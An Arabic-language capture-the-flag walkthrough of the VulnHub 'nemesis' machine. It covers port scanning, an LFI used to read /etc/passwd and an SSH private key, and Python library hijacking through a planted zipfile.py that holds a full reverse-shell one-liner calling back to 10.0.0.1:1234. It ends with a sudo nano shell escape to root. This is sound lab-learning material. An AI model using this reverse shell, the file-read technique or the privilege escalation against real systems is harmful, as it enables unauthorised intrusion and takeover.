# vulnhub nemesis

CTF السلام عليكم اليوم سنحل تحدي 

VULNHUB من تحديات  
يمكنك تحميله من هنا 

[nemesis](https://www.vulnhub.com/entry/ia-nemesis-101,582/)


## Walkthrough

### scanning
 nmap نبدا بفحص السيرفر ب 

 ![Desktop View](/img/nem/1.png)

     نلاحظ وجود 4 بورت

80 : الخاص بالويب سيرفر

52845: شغال ويب سيرفر 

52846: ssh خاص ب 

## Enumeration
 نتصفح الموقع 

  ![Desktop View](/img/nem/2.png)


عند القاء نظرة على سورس كود نجد كلمة سر واسم مستخدم


 ![Desktop View](/img/nem/3.png)

rabbit hole عبارة عن 
 
port 52845 نتصفح 

web application عند فحص 

lfi نجد انه مصاب بثغرة 

![Desktop View](/img/nem/4.png)

لنرى اليوزرس المتواجدين هنا passwd نقوم بسحب ملف 

![Desktop View](/img/nem/5.png)


thanos نجد يوزر 

ssh key نبحث داخله هل هناك 

../../../../home/thanos

![Desktop View](/img/nem/7.png)

وجدنا الملف الان نقوم بحفظه و تغير الصلاحيات 

![Desktop View](/img/nem/8.png)

نتصل ب السيرفر الان 

![Desktop View](/img/nem/9.png)

 كل مدت زمنية backup  يقوم بعمل python نجد ملف 

![Desktop View](/img/nem/10.png)


 
zipfile باسم python نقوم بانشاء ملف 

nc و نشغل 

python يعمل ملف carloss عندما يتم تشغيل الملف بواسطة  

  لشال الخاص بنا import 
  ```
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);

  ```


![Desktop View](/img/nem/11.png)

ننتظر قليل حتى نحصل على الاتصال من السيرفر

![Desktop View](/img/nem/12.png)


home directory نجد داخل  
ملف يقوم بالتشفير بداخله كلمة سر

![Desktop View](/img/nem/13.png)

affine نلاحظ انه عمل تشفير ب 

![Desktop View](/img/nem/14.png)

نقوم بفك تشفيره 

![Desktop View](/img/nem/16.png)

نحصل على كلمة سر 




## Privilege Escalation 


 ان يشغل بصلاحيات رووت carlos ثم نرى ماذا  يستطيع  

 باستخدام الامر التالي
 ```
 sudo -l 
 ```

![Desktop View](/img/nem/18.png)


![Desktop View](/img/nem/20.png)

gtfobiins نتوجه الى  nano نجد ان يستطيع استخدام 

![Desktop View](/img/nem/21.png)


نكتب
```
sudo nano
^R^X
reset; sh 1>&0 2>&0
```

![Desktop View](/img/nem/22.png)




ROOT نحصل على 

![Desktop View](/img/nem/23.png)
